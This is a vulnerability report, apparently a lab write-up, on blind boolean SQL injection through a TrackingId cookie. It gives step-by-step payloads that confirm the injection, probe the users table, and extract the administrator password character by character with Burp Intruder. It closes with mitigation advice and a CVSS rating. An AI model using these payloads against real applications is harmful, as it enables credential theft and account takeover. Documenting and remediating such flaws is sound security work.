# Title: Blind SQL Injection with Conditional Responses Leading to Administrator Account Compromise

## Description

The application is vulnerable to Blind SQL Injection through the `TrackingId` cookie used for analytics purposes. User-controlled cookie values are incorporated directly into a backend SQL query without proper sanitization or parameterized statements.

Unlike traditional SQL Injection vulnerabilities, the application does not return database results or error messages. Instead, the application conditionally displays a **"Welcome back"** message when the SQL query returns one or more rows. This behavior enables an attacker to infer database information by evaluating boolean conditions.

Using this side-channel response difference, an attacker can enumerate database contents and extract sensitive information, including user credentials.

---

## Steps to Exploit

### 1. Identify the Injection Point

1. Navigate to the application's homepage.
2. Intercept the request using Burp Suite.
3. Locate the `TrackingId` cookie.
4. Modify the cookie value with a boolean condition:

```sql
TrackingId=xyz' AND '1'='1
```

5. Forward the request.
6. Observe that the **Welcome back** message is displayed.

### 2. Confirm Blind SQL Injection

Modify the cookie value:

```sql
TrackingId=xyz' AND '1'='2
```

Forward the request and observe that the **Welcome back** message disappears.

This confirms that application behavior changes based on the result of injected SQL conditions.

### 3. Verify Database Objects

Check for the existence of the `users` table:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

The presence of the **Welcome back** message confirms the table exists.

Verify the existence of the administrator account:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

The response confirms that an administrator user exists.

### 4. Determine Password Length

Use conditional queries to identify the password length:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Increment the length value until the condition becomes false.

Example:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```

The testing revealed that the administrator password length is **20 characters**.

### 5. Extract Password Characters

Use the `SUBSTRING()` function to extract individual password characters.

Example:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

Send the request to Burp Intruder.

Configure payloads:

* Character set: `a-z`
* Numeric set: `0-9`
* Grep Match: `Welcome back`

For each password position:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='a
```

Continue until all 20 characters are recovered.

### 6. Authenticate as Administrator

1. Navigate to the login page.
2. Use the extracted administrator credentials.
3. Successfully authenticate and gain access to the administrator account.

---

## Proof of Concept

### Boolean-Based Verification

**True Condition**

```sql
TrackingId=xyz' AND '1'='1
```

Result:

```text
Welcome back message displayed
```

**False Condition**

```sql
TrackingId=xyz' AND '1'='2
```

Result:

```text
Welcome back message not displayed
```

### Password Character Extraction

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

If the response contains **Welcome back**, the tested character is correct.

This process can be repeated for every character position until the complete password is recovered.

---

## Impact

* Unauthorized disclosure of sensitive database information.
* Exposure of user credentials, including administrator accounts.
* Complete compromise of administrative functionality.
* Potential privilege escalation within the application.
* Increased risk of further attacks against backend systems.
* Loss of confidentiality and trust in the application.

---

## Mitigation / Remediation

### 1. Use Parameterized Queries

Implement prepared statements for all database interactions.

**Secure Example**

```sql
SELECT * FROM tracking WHERE tracking_id = ?
```

### 2. Validate User Input

Apply strict server-side validation and sanitization for all cookie values and user-supplied input.

### 3. Implement Least Privilege

Ensure database accounts have only the minimum permissions required for application functionality.

### 4. Reduce Information Leakage

Avoid response variations that reveal query execution results. Error messages and conditional content should not disclose backend behavior.

### 5. Conduct Security Testing

Perform regular code reviews, penetration testing, and automated security scanning to identify SQL Injection vulnerabilities.

---

## CVSS Score

**CVSS v3.1 Score:** 9.1 (Critical)

**Vector:**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                              |
| ------------------- | --------- | ---------------------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely via HTTP requests                     |
| Attack Complexity   | Low       | Requires only crafted cookie values                        |
| Privileges Required | None      | No authentication required                                 |
| User Interaction    | None      | No victim interaction required                             |
| Scope               | Unchanged | Impact remains within the vulnerable application           |
| Confidentiality     | High      | Complete extraction of administrator credentials           |
| Integrity           | Low       | Administrative access may allow unauthorized modifications |
| Availability        | None      | No direct service disruption observed                      |

---

## Conclusion

The application is vulnerable to Blind SQL Injection through the analytics tracking cookie. Although query results and errors are hidden, conditional application responses enable attackers to infer database contents and extract sensitive information. Successful exploitation allows recovery of administrator credentials and complete administrative account compromise.
